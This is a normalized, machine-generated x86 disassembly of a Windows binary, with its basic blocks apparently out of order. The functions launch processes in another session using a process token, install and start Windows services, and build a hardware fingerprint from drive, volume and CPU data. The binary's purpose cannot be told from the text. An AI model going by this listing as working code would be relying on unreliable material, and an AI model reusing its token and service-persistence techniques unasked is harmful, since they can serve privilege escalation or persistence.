mov ebx [ ebp - 0x29c ]
mov [ ebp - 0x8 ] 0x2000400
jmp r-xdata
push 0x1
push eax
lea eax [ ebp - 0x29c ]
push eax
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x8 ] 0x2000000
call [ CreateEnvironmentBlock@IAT ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x290 ]
push eax
push esi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x288 ]
call [ ProcessIdToSessionId@IAT ]
test eax eax
je r-xdata
xor eax eax
mov eax 0x5
jmp r-xdata
push 0x44
lea eax [ ebp - 0x60 ]
push 0x0
push eax
call sub_41cae0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp [ eax ] 0x0
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x34 ] 0x1
je r-xdata
lea eax [ ebp - 0x298 ]
push eax
push 0xf00ff
push esi
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x26c ]
push r--data
push eax
call sub_419a78
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
lea ecx [ ebp - 0x2b0 ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
push 0x0
push ebx
push [ ebp - 0x8 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push [ ebp - 0x294 ]
call [ CreateProcessAsUserW@IAT ]
cmp [ ebp - 0x2b0 ] 0x0
mov ebx eax
je r-xdata
mov eax [ eax ]
mov [ ebp - 0x30 ] ax
mov eax [ ebp - 0x2b4 ]
xorps xmm0 xmm0
cmp [ eax + 0x14 ] 0x8
movq [ ebp - 0x2b0 ] xmm0
movq [ ebp - 0x2a8 ] xmm0
jb r-xdata
push esi
call edi
mov eax [ ebp - 0x288 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x294 ]
test eax eax
je r-xdata
push [ ebp - 0x2ac ]
call edi
push [ ebp - 0x2b0 ]
call edi
test esi esi
je r-xdata
push eax
call edi
mov eax [ ebp - 0x298 ]
test eax eax
je r-xdata
push esi
call edi
mov eax [ ebp - 0x29c ]
test eax eax
je r-xdata
push eax
call edi
mov ecx [ ebp - 0x4 ]
test ebx ebx
pop edi
setne al
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn 0x8
push eax
call [ DestroyEnvironmentBlock@IAT ]
sub_414790
push ebp
mov ebp esp
push 0xffffffff
push sub_430b98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor ecx ecx
push 0xffffffff
push ecx
mov [ ebp - 0x2c ] cx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
call sub_408340
push 0xf003f
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x0
call [ OpenSCManagerW@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
xor bl bl
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0xc
push [ ebp - 0x2c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x18 ] 0x8
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov esi [ esi ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push 0x1
push 0x2
push 0x10
push 0xf01ff
push eax
push edi
push ecx
call [ CreateServiceW@IAT ]
mov esi eax
call [ GetLastError@IAT ]
test esi esi
je r-xdata
mov edi [ edi ]
lea eax [ ebp - 0x30 ]
push eax
push 0x1
push esi
mov [ ebp - 0x30 ] r--data
call [ ChangeServiceConfig2W@IAT ]
push esi
call [ CloseServiceHandle@IAT ]
mov bl 0x1
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
sub_4148a0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx + 0x14 ] 0x8
push esi
mov esi [ ebp + 0x8 ]
push edi
jb r-xdata
push 0xf01ff
push ecx
push esi
call [ OpenServiceW@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov ecx [ ecx ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call [ QueryServiceStatus@IAT ]
push 0x0
push 0x0
push edi
mov [ ebp - 0x1c ] 0x1
call [ StartServiceW@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov al 0x1
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
pop edi
xor al al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_414930
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
jb r-xdata
push esi
push 0xf01ff
push ecx
push eax
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ ecx ]
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
cmp [ ebp - 0x1c ] 0x1
je r-xdata
xor al al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
sub_4149b0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ecx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
jb r-xdata
push esi
push 0xf01ff
push ecx
push eax
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx [ ecx ]
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
push esi
call [ DeleteService@IAT ]
test eax eax
je r-xdata
xor al al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
push esi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x4 ]
test eax eax
setne al
xor ecx ebp
pop esi
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_414a30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
push rw-data
push [ rw-data ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call [ SetServiceStatus@IAT ]
mov [ rw-data ] 0x0
dec eax
je r-xdata
mov [ rw-data ] 0x7
pop ebp
retn 0x4
dec eax
jne r-xdata
pop ebp
retn 0x4
mov [ rw-data ] 0x4
pop ebp
retn 0x4
sub_414ab0
cmp [ rw-data ] 0x8
mov eax rw-data
cmovae eax [ rw-data ]
push sub_414a30
push eax
mov [ rw-data ] 0x30
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call [ RegisterServiceCtrlHandlerW@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
retn 0x8
push esi
push rw-data
push eax
mov [ rw-data ] 0x4
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call [ SetServiceStatus@IAT ]
mov esi [ Sleep@IAT ]
mov [ rw-data ] 0x1
lea esp [ esp ]
push 0x3e8
call esi
cmp [ rw-data ] 0x0
jne r-xdata
pop esi
sub_414b80
push ebp
mov ebp esp
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x5 ]
call sub_414bb0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
sub_414bb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430f18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esp + 0x24 ] 0x7
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] ax
cmp [ esi ] ax
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
lea ecx [ esp + 0x18 ]
call sub_408240
push 0x38
push r--data
mov [ esp + 0x50 ] 0x0
push [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x20 ]
call sub_414350
test eax eax
setne bl
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x24 ] 0x8
jb r-xdata
test bl bl
je r-xdata
push [ esp + 0x10 ]
call j_sub_417912#2
add esp 0x4
cmp [ esi ] 0x0
mov [ rw-data ] 0x1
jne r-xdata
push 0x0
push 0x0
push r--data
push sub_414b80
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov al 0x1
jmp r-xdata
mov ecx esi
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_4170bc
mov esp ebp
pop ebp
retn 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push esi
mov ecx rw-data
call sub_408240
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] sub_414ab0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call [ StartServiceCtrlDispatcherW@IAT ]
test eax eax
setne al
sub_414d10
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ GlobalAlloc@IAT ]
push edi
push 0x20
push 0x40
mov [ ebp - 0x14 ] edx
mov ebx ecx
call esi
push 0x210
mov edi eax
push 0x40
mov [ ebp - 0x10 ] edi
call esi
push 0x0
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
push 0x210
push esi
push 0x20
push edi
push 0x7c088
mov [ edi + 0xa ] 0xec
mov [ edi ] 0x0
push ebx
mov [ ebp - 0xc ] esi
mov [ esi ] 0x200
call [ DeviceIoControl@IAT ]
mov edi [ ebp - 0x14 ]
push [ ebp - 0xc ]
add esi 0x10
mov ecx 0x80
[ edi ] [ esi ]
mov esi [ GlobalFree@IAT ]
mov ebx eax
call esi
push [ ebp - 0x10 ]
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_414db0
push ebp
mov ebp esp
push 0xffffffff
push sub_430fb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x2c ] edi
cmp [ edx + 0x10 ] 0x0
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x34 ] 0x0
jbe r-xdata
push 0xffffffff
push 0x0
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push edx
mov [ edi ] 0x0
call sub_401500
cmp [ esi + 0x10 ] 0x0
jbe r-xdata
push 0xffffffff
push 0x0
push edx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_401500
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call sub_40b140
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov edi [ ebp - 0x30 ]
lea esp [ esp ]
push [ esi + 0x10 ]
lea ecx [ ebp - 0x28 ]
push 0x0
push eax
call sub_40c8f0
cmp eax 0xffffffff
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebx [ edi + 0x10 ]
push 0xffffffff
push 0x0
push edi
push [ esi + 0x10 ]
lea ecx [ ebp - 0x28 ]
push eax
add ebx eax
call sub_40ec40
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edi [ ebp - 0x2c ]
push [ esi + 0x10 ]
lea ecx [ ebp - 0x28 ]
push ebx
push eax
call sub_40c8f0
cmp eax 0xffffffff
jne r-xdata
sub_414ee0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x20 ] 0x0
test edx edx
jne r-xdata
cmp [ edx ] 0x0
mov [ ebp - 0x8 ] 0xf
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x1c ] 0x0
jne r-xdata
push 0x7
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edx
push r--data
mov [ esi ] dl
call sub_401630
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov ecx edx
lea edi [ ecx + 0x1 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
push ecx
push edx
lea ecx [ ebp - 0x1c ]
call sub_401630
mov edx [ ebp - 0xc ]
xor ecx ecx
test edx edx
je r-xdata
sub ecx edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0x8 ]
cmp ecx 0x10
jae r-xdata
mov edi [ ebp - 0x8 ]
mov ebx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
inc eax
je r-xdata
cmp eax 0x41
jb r-xdata
cmp eax 0x39
jbe r-xdata
mov eax [ ebp - 0xc ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
call sub_4170d0
mov ecx [ ebp - 0x8 ]
add esp 0xc
jmp r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
jbe r-xdata
inc ecx
cmp ecx edx
jb r-xdata
cmp eax 0x2d
je r-xdata
cmp eax 0x7a
jbe r-xdata
cmp edi 0x10
lea eax [ ebp - 0x1c ]
cmovae eax ebx
movsx ax [ eax + ecx ]
movzx eax ax
cmp eax 0x30
jb r-xdata
cmp edi 0x10
lea eax [ ebp - 0x1c ]
cmovae eax ebx
mov [ eax + ecx ] 0x58
mov edi [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov ebx [ ebp - 0x1c ]
sub_415020
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push 0x0
lea eax [ ebp - 0x2c ]
push r--data
push eax
mov ebx edx
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x2c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x3
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x34 ] eax
cmp eax 0xffffffff
jne r-xdata
mov edx ebx
mov ecx eax
call sub_414d10
mov [ ebp - 0x38 ] eax
test eax eax
je r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x38 ]
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
push esi
lea esi [ ebx + 0x14 ]
push edi
lea edx [ esi + 0x1 ]
mov edi 0xa
lea ebx [ ebx ]
mov cl [ edx - 0x1 ]
mov al [ edx ]
mov [ edx - 0x1 ] al
mov [ edx ] cl
lea edx [ edx + 0x2 ]
dec edi
jne r-xdata
xor ecx ecx
mov eax 0x14
sub eax ecx
push eax
lea eax [ esi + ecx ]
push eax
push esi
call sub_4170d0
add esp 0xc
mov eax 0x13
cmp [ esi + ecx + 0x1 ] 0x20
jne r-xdata
mov esi ebx
add esi 0x36
mov edi 0x14
lea edx [ esi + 0x1 ]
dec eax
mov [ esi + eax + 0x1 ] 0x0
jns r-xdata
inc ecx
cmp [ esi + ecx + 0x2 ] 0x20
jne r-xdata
mov cl [ edx - 0x1 ]
mov al [ edx ]
mov [ edx - 0x1 ] al
mov [ edx ] cl
lea edx [ edx + 0x2 ]
dec edi
jne r-xdata
xor ecx ecx
cmp [ esi + eax ] 0x20
jne r-xdata
add ecx 0x2
jmp r-xdata
cmp [ esi + ecx + 0x3 ] 0x20
jne r-xdata
mov eax 0x28
sub eax ecx
push eax
lea eax [ esi + ecx ]
push eax
push esi
call sub_4170d0
add esp 0xc
mov eax 0x27
jmp r-xdata
cmp [ esi + ecx + 0x1 ] 0x20
jne r-xdata
add ecx 0x3
jmp r-xdata
cmp [ esi + ecx + 0x4 ] 0x20
jne r-xdata
cmp [ esi + eax ] 0x20
jne r-xdata
inc ecx
cmp [ esi + ecx + 0x2 ] 0x20
jne r-xdata
add ecx 0x4
jmp r-xdata
add ecx 0x5
cmp ecx 0x14
jl r-xdata
mov esi ebx
add esi 0x2e
mov edi 0x4
lea edx [ esi + 0x1 ]
jmp r-xdata
dec eax
mov [ esi + eax + 0x1 ] 0x0
jns r-xdata
add ecx 0x2
jmp r-xdata
cmp [ esi + ecx + 0x3 ] 0x20
jne r-xdata
cmp [ esi + ecx ] 0x20
jne r-xdata
jmp r-xdata
mov cl [ edx - 0x1 ]
mov al [ edx ]
mov [ edx - 0x1 ] al
mov [ edx ] cl
lea edx [ edx + 0x2 ]
dec edi
jne r-xdata
add ecx 0x3
jmp r-xdata
cmp [ esi + ecx + 0x4 ] 0x20
jne r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
add ecx 0x5
cmp ecx 0x28
jl r-xdata
mov eax 0x8
sub eax ecx
push eax
lea eax [ esi + ecx ]
push eax
push esi
call sub_4170d0
add esp 0xc
mov eax 0x7
inc ecx
cmp ecx 0x8
jl r-xdata
cmp [ esi + ecx ] 0x20
jne r-xdata
jmp r-xdata
pop edi
pop esi
dec eax
mov [ esi + eax + 0x1 ] 0x0
jns r-xdata
cmp [ esi + ecx ] 0x20
jne r-xdata
cmp [ esi + eax ] 0x20
jne r-xdata
sub_415220
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push r--data
xor edi edi
push r--data
mov [ ebp - 0x14 ] edi
mov [ ebp - 0xc ] 0x208
mov [ ebp - 0x10 ] 0x1
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov [ ebp - 0x8 ] edi
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push r--data
push [ ebp - 0x14 ]
call [ RegQueryValueExW@IAT ]
mov ecx 0x1
test eax eax
cmove edi ecx
cmp [ ebp - 0x8 ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
push ecx
call [ RegCloseKey@IAT ]
mov esi [ RegOpenKeyExW@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push 0x20219
push edi
push r--data
push 0x80000002
call esi
lea eax [ ebp - 0x14 ]
push eax
push 0x20219
push edi
push r--data
push 0x80000002
call esi
jmp r-xdata
test eax eax
jne r-xdata
sub_415320
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax 0x1
xor edx edx
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push eax
push edx
push r--data
push 0x208
push esi
call sub_417b6e
add esp 0x14
mov eax 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415380
push ebp
mov ebp esp
push 0xffffffff
push sub_430f7c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4a4 ] edi
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x6b0 ]
call sub_415020
test eax eax
je r-xdata
mov edx rw-data
lea ecx [ edx + 0x2 ]
jmp r-xdata
xor eax eax
push 0xff
mov [ ebp - 0x60 ] ax
mov [ ebp - 0x3e ] eax
mov [ ebp - 0x3a ] ax
mov [ ebp - 0x38 ] ax
mov [ ebp - 0x16 ] eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4a8 ]
push eax
lea eax [ ebp - 0x4ac ]
push eax
xorps xmm0 xmm0
lea eax [ ebp - 0x4a4 ]
push eax
push 0xff
lea eax [ ebp - 0x60 ]
push eax
push 0x0
movq [ ebp - 0x5e ] xmm0
movq [ ebp - 0x56 ] xmm0
movq [ ebp - 0x4e ] xmm0
movq [ ebp - 0x46 ] xmm0
movq [ ebp - 0x36 ] xmm0
movq [ ebp - 0x2e ] xmm0
movq [ ebp - 0x26 ] xmm0
movq [ ebp - 0x1e ] xmm0
call [ GetVolumeInformationW@IAT ]
xor eax eax
push 0x40e
push eax
mov [ ebp - 0x470 ] ax
lea eax [ ebp - 0x46e ]
push eax
call sub_41cae0
add esp 0xc
lea ecx [ ebp - 0x470 ]
call sub_415320
test eax eax
jne r-xdata
cmp [ ebp - 0x69c ] 0x0
mov [ ebp - 0x48c ] 0xf
mov [ ebp - 0x490 ] 0x0
mov [ ebp - 0x4a0 ] 0x0
jne r-xdata
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
push 0x80
push 0x0
push edi
call sub_41cae0
add esp 0xc
lea eax [ ebp - 0x470 ]
push [ ebp - 0x4a4 ]
push eax
push r--data
push 0x40
push edi
call sub_417b6e
add esp 0x14
push ecx
lea eax [ ebp - 0x470 ]
push eax
push ecx
call sub_415220
add esp 0xc
lea ecx [ ebp - 0x69c ]
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
sub edx ecx
sar edx 0x1
push edx
push rw-data
push 0x40
push edi
call sub_419c88
add esp 0x10
xor eax eax
mov [ edi + 0x7e ] ax
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push edi
push 0x104
push rw-data
call sub_419c88
add esp 0x10
xor eax eax
mov [ rw-data ] ax
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x69c ]
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_401630
mov [ ebp - 0x4 ] 0x0
push 0x1
push r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x3c ] 0xf
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x50 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x1
push 0x1
push r--data
lea ecx [ ebp - 0x6c8 ]
mov [ ebp - 0x6b4 ] 0xf
mov [ ebp - 0x6b8 ] 0x0
mov [ ebp - 0x6c8 ] 0x0
call sub_401630
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x6c8 ]
push eax
lea edx [ ebp - 0x4a0 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_414db0
mov esi eax
lea eax [ ebp - 0x4a0 ]
add esp 0x8
cmp eax esi
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x48c ] 0x10
jb r-xdata
cmp [ ebp - 0x6b4 ] 0x10
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x4a0 ]
mov [ ebp - 0x48c ] 0xf
mov [ ebp - 0x490 ] 0x0
mov [ ebp - 0x4a0 ] 0x0
call sub_40c7e0
push [ ebp - 0x4a0 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x3c ] 0x10
mov [ ebp - 0x6b4 ] 0xf
mov [ ebp - 0x6b8 ] 0x0
mov [ ebp - 0x6c8 ] 0x0
jb r-xdata
push [ ebp - 0x6c8 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x67a ] 0x0
mov [ ebp - 0x474 ] 0xf
mov [ ebp - 0x478 ] 0x0
mov [ ebp - 0x488 ] 0x0
jne r-xdata
push [ ebp - 0x50 ]
call j_sub_417912#2
add esp 0x4
lea ecx [ ebp - 0x67a ]
lea edx [ ecx + 0x1 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x67a ]
push eax
lea ecx [ ebp - 0x488 ]
call sub_401630
mov [ ebp - 0x4 ] 0x3
push 0x1
push r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x3c ] 0xf
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x50 ] 0x0
call sub_401630
mov [ ebp - 0x4 ] 0x4
push 0x1
push r--data
lea ecx [ ebp - 0x6c8 ]
mov [ ebp - 0x6b4 ] 0xf
mov [ ebp - 0x6b8 ] 0x0
mov [ ebp - 0x6c8 ] 0x0
call sub_401630
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x6c8 ]
push eax
lea edx [ ebp - 0x488 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x5
call sub_414db0
mov esi eax
lea eax [ ebp - 0x488 ]
add esp 0x8
cmp eax esi
je r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x474 ] 0x10
jb r-xdata
cmp [ ebp - 0x6b4 ] 0x10
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x488 ]
mov [ ebp - 0x474 ] 0xf
mov [ ebp - 0x478 ] 0x0
mov [ ebp - 0x488 ] 0x0
call sub_40c7e0
push [ ebp - 0x488 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x3c ] 0x10
mov [ ebp - 0x6b4 ] 0xf
mov [ ebp - 0x6b8 ] 0x0
mov [ ebp - 0x6c8 ] 0x0
jb r-xdata
push [ ebp - 0x6c8 ]
